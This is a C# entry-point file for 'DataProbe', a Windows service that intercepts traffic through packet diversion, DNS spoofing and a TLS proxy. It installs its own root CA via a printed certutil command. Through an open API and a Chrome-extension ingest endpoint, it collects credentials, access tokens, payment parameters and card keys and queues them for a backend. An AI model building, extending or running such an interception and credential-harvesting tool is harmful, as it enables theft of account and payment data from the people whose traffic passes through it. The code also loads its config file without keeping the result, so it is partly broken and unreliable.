using System.Text.Json;
using DataProbe.Capture;
using DataProbe.Core;
using DataProbe.Extractor;
using DataProbe.Http;
using DataProbe.Tls;

var _startTime = DateTime.UtcNow;

// ── Configuration ──────────────────────────────────────
var configPath = Path.Combine(
    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
    "DataProbe", "config.json");

var config = new DataProbeConfig();
if (File.Exists(configPath))
{
    var json = File.ReadAllText(configPath);
    JsonSerializer.Deserialize<DataProbeConfig>(json);
}

// CLI overrides
for (int i = 0; i < args.Length; i++)
{
    if (args[i] == "--api-port" && i + 1 < args.Length) config.ApiPort = int.Parse(args[++i]);
    if (args[i] == "--tls-port" && i + 1 < args.Length) config.TlsProxyPort = int.Parse(args[++i]);
    if (args[i] == "--backend" && i + 1 < args.Length) config.BackendUrl = args[++i];
    if (args[i] == "--target-domains" && i + 1 < args.Length)
        config.TargetDomains = args[++i].Split(',');
    if (args[i] == "--spoof-domains" && i + 1 < args.Length)
        config.SpoofDomains = args[++i].Split(',');
    if (args[i] == "--sni-keywords" && i + 1 < args.Length)
        config.SniKeywords = args[++i].Split(',');
    if (args[i] == "--install-cert")
    {
        var mgr = new CertificateManager(config);
        var derData = mgr.ExportRootCaCert();
        var tempCer = Path.Combine(Path.GetTempPath(), "dataprobe_ca.cer");
        File.WriteAllBytes(tempCer, derData);
        Console.WriteLine($"[DataProbe] Certificate exported: {tempCer}");
        Console.WriteLine("[DataProbe] Install: certutil -addstore -f Root \"" + tempCer + "\"");
        return;
    }
}

// ── Services ──────────────────────────────────────────

var credQueue = new CredentialQueue(config);
var connTracker = new ConnectionTracker(config);
var packetFilter = new PacketFilter(config.TargetDomains);
var certMgr = new CertificateManager(config);
var httpParser = new HttpParser();
var ruleEngine = new RuleEngine();

var trafficBuffer = new TrafficBuffer();

var protocolRegistry = new ProtocolRegistry();
protocolRegistry.AddParser(new Http11Parser());
protocolRegistry.AddParser(new Http2Parser());
Console.WriteLine($"[DataProbe] Protocol parsers: {protocolRegistry.Count}");

var channelMgr = new ChannelManager();

var winDivertCh = new WinDivertChannel(config, connTracker, packetFilter);
winDivertCh.SetSniKeywords(config.SniKeywords);
channelMgr.Register(winDivertCh);

var dnsSpoofCh = new DnsSpoofChannel();
dnsSpoofCh.SetSpoofDomains(config.SpoofDomains);
channelMgr.Register(dnsSpoofCh);

var tlsProxyCh = new TlsProxyChannel(config, certMgr, credQueue, ruleEngine, protocolRegistry, trafficBuffer);
channelMgr.Register(tlsProxyCh);

// ── ASP.NET Core Host ─────────────────────────────────

var builder = WebApplication.CreateBuilder(args);
builder.Host.UseWindowsService(o => o.ServiceName = "DataProbeService");
builder.WebHost.UseUrls($"http://{config.ApiBindAddress}:{config.ApiPort}");

builder.Services.AddCors(o => o.AddDefaultPolicy(p => p.AllowAnyOrigin().AllowAnyMethod().AllowAnyHeader()));
builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen(o =>
{
    o.SwaggerDoc("v1", new()
    {
        Title = "DataProbe API",
        Description = "Universal Data Collector Engine",
        Version = "1.0.0"
    });
    var xmlFile = $"{System.Reflection.Assembly.GetExecutingAssembly().GetName().Name}.xml";
    var xmlPath = Path.Combine(AppContext.BaseDirectory, xmlFile);
    if (File.Exists(xmlPath)) o.IncludeXmlComments(xmlPath);
});

var app = builder.Build();
app.UseCors();
app.UseDefaultFiles();
app.UseStaticFiles();
app.UseSwagger();
app.UseSwaggerUI(o =>
{
    o.SwaggerEndpoint("/swagger/v1/swagger.json", "DataProbe API v1");
    o.RoutePrefix = "api/docs";
});

// ── API Endpoints ─────────────────────────────────────

app.MapGet("/status", () =>
{
    var uptime = DateTime.UtcNow - _startTime;
    var tp = channelMgr.Get("TlsProxy") as TlsProxyChannel;
    var ds = channelMgr.Get("DnsSpoof") as DnsSpoofChannel;
    var wd = channelMgr.Get("WinDivert") as WinDivertChannel;
    return Results.Ok(new
    {
        status = true ? "running" : "stopped",
        version = "1.0.0",
        uptime_seconds = uptime.TotalSeconds,
        credentials_queued = credQueue.TotalEnqueued,
        credentials_sent = credQueue.TotalSent,
        credentials_failed = credQueue.TotalFailed,
        active_tls_sessions = tp?.ActiveConnections ?? 0,
        total_connections = tp?.TotalConnections ?? 0,
        dns_spoofed = ds?.SpoofedCount ?? 0,
        active_connections = connTracker.ActiveCount,
    });
}).WithName("GetStatus").WithDescription("引擎运行状态和统计");

app.MapPost("/start", () =>
{
    channelMgr.StartAllAsync().GetAwaiter().GetResult();
    return Results.Ok(new { status = "started" });
}).WithName("StartCapture").WithDescription("启动所有采集通道");

app.MapPost("/stop", () =>
{
    channelMgr.StopAllAsync().GetAwaiter().GetResult();
    return Results.Ok(new { status = "stopped" });
}).WithName("StopCapture").WithDescription("停止所有采集通道");

app.MapGet("/data", () =>
{
    var recent = credQueue.GetRecentCredentials();
    return Results.Ok(new
    {
        total = credQueue.TotalEnqueued,
        sent = credQueue.TotalSent,
        failed = credQueue.TotalFailed,
        items = recent.Select(c => new
        {
            id = c.Id,
            type = c.Type.ToString(),
            value = c.Value,
            platform = c.Platform,
            source = c.Source,
            identity = c.IdentityToken,
            method = c.Method,
            metadata = c.Metadata,
            captured_at = c.CapturedAt,
        }).ToList()
    });
}).WithName("GetData").WithDescription("查看已提取的结构化数据");

app.MapGet("/traffic", () =>
{
    return Results.Ok(new { items = trafficBuffer.GetAll() });
}).WithName("GetTraffic").WithDescription("查看原始解密流量（Fiddler风格）");

app.MapGet("/config", () => Results.Ok(config))
    .WithName("GetConfig").WithDescription("查看当前配置");

app.MapPut("/config", (DataProbeConfig newConfig) =>
{
    var dir = Path.GetDirectoryName(configPath)!;
    Directory.CreateDirectory(dir);
    File.WriteAllText(configPath, JsonSerializer.Serialize(newConfig));
    return Results.Ok(new { status = "saved" });
}).WithName("UpdateConfig").WithDescription("更新配置并持久化");

app.MapPost("/api/capture/ingest", async (HttpRequest req) =>
{
    try
    {
        var body = await req.ReadFromJsonAsync<Dictionary<string, object>>();
        if (body == null) return Results.BadRequest(new { error = "invalid_json" });

        var cred = new Credential
        {
            Type = ParseDataType(body.GetValueOrDefault("type", "")?.ToString() ?? ""),
            Value = body.GetValueOrDefault("value", "")?.ToString() ?? "",
            Platform = body.GetValueOrDefault("platform", "")?.ToString() ?? "unknown",
            ProductId = body.GetValueOrDefault("product_id", "")?.ToString() ?? "",
            Source = body.GetValueOrDefault("source", "external")?.ToString() ?? "external",
            IdentityToken = body.GetValueOrDefault("identity", "")?.ToString() ?? "",
            Method = body.GetValueOrDefault("method", "")?.ToString() ?? "",
            CapturedAt = DateTime.UtcNow,
            Metadata = new Dictionary<string, string>(),
        };

        foreach (var (k, v) in body)
        {
            if (k is "type" or "value" or "platform" or "product_id" or "source"
                or "identity" or "method" or "captured_at" or "body") continue;
            cred.Metadata[k] = v?.ToString() ?? "";
        }

        await credQueue.EnqueueAsync(cred);
        return Results.Ok(new { status = "queued", id = cred.Id });
    }
    catch (Exception ex) { return Results.Problem(ex.Message); }
}).WithName("IngestData").WithDescription("外部数据注入点（Chrome 扩展等外部采集器使用）");

app.MapGet("/rules", () =>
{
    var rules = ruleEngine.GetAllRules();
    return Results.Ok(new { count = rules.Count, rules = rules.Select(r => new
    {
        id = r.Id, name = r.Name, enabled = r.Enabled, priority = r.Priority,
        matcher_count = r.Matchers.Count, extractor_count = r.Extractors.Count,
        total_captured = r.TotalCaptured, last_matched = r.LastMatchedAt,
    }).ToList() });
}).WithName("GetRules").WithDescription("列出所有提取规则");

app.MapPost("/rules", (PlatformRule rule) =>
{
    rule.Enabled = true;
    rule.Priority = rule.Priority == 0 ? 100 : rule.Priority;
    rule.CreatedAt = DateTime.UtcNow;
    ruleEngine.SaveRule(rule);
    return Results.Ok(new { status = "created", id = rule.Id ?? rule.Name });
}).WithName("CreateRule").WithDescription("创建提取规则");

app.MapDelete("/rules/{id}", (string id) =>
{
    var deleted = ruleEngine.DeleteRule(id);
    return deleted ? Results.Ok(new { status = "deleted" }) : Results.NotFound(new { error = "not found" });
}).WithName("DeleteRule").WithDescription("删除提取规则");

app.MapGet("/help", () =>
{
    return Results.Ok(new
    {
        name = "DataProbe",
        version = "1.0.0",
        description = "Universal Data Collector Engine",
        endpoints = new
        {
            status = "GET /status",
            start = "POST /start",
            stop = "POST /stop",
            data = "GET /data",
            traffic = "GET /traffic",
            rules = "GET /rules, POST /rules, DELETE /rules/{id}",
            config = "GET /config, PUT /config",
            ingest = "POST /api/capture/ingest",
            docs = "GET /api/docs (Swagger UI)",
        }
    });
}).WithName("GetHelp").WithDescription("API 帮助");

// Export CA certificate
app.MapGet("/cert", () =>
{
    try
    {
        var derData = certMgr.ExportRootCaCert();
        return Results.File(derData, "application/x-x509-ca-cert", "dataprobe_root_ca.cer");
    }
    catch (Exception ex) { return Results.Problem(ex.Message); }
}).WithName("GetCert").WithDescription("下载根 CA 证书");

// ── Startup Banner ───────────────────────────────────

Console.WriteLine($@"
╔══════════════════════════════════════════════════════════╗
║          DataProbe v1.0                                   ║
║          Universal Data Collector Engine                   ║
╠══════════════════════════════════════════════════════════╣
║  API Server  : http://{config.ApiBindAddress}:{config.ApiPort}       ║
║  HTTPS Proxy : 127.0.0.1:{config.TlsProxyPort}                        ║
║  Backend     : {config.BackendUrl ?? "(none)",-44}║
║  Rules       : {ruleEngine.RuleCount,-2} loaded                          ║
║  Targets     : {config.TargetDomains.Length,-2} domains                   ║
║  Swagger     : http://{config.ApiBindAddress}:{config.ApiPort}/api/docs  ║
╚══════════════════════════════════════════════════════════╝");

// ── Graceful Shutdown ────────────────────────────────

var lifetime = app.Services.GetRequiredService<IHostApplicationLifetime>();
lifetime.ApplicationStopping.Register(() =>
{
    channelMgr.StopAllAsync().GetAwaiter().GetResult();
    credQueue.Dispose();
});

await app.RunAsync();

// ── Helpers ──────────────────────────────────────────

static CapturedDataType ParseDataType(string type) => type.ToLower() switch
{
    "url" => CapturedDataType.Url,
    "params" => CapturedDataType.Params,
    "token" => CapturedDataType.Token,
    "image" or "qr_image" => CapturedDataType.Image,
    "key" or "card_key" => CapturedDataType.Key,
    "iframe_url" or "payment_url" => CapturedDataType.Url,
    "payment_params" or "payment_params_raw" => CapturedDataType.Params,
    "access_token" => CapturedDataType.Token,
    _ => CapturedDataType.RawData
};
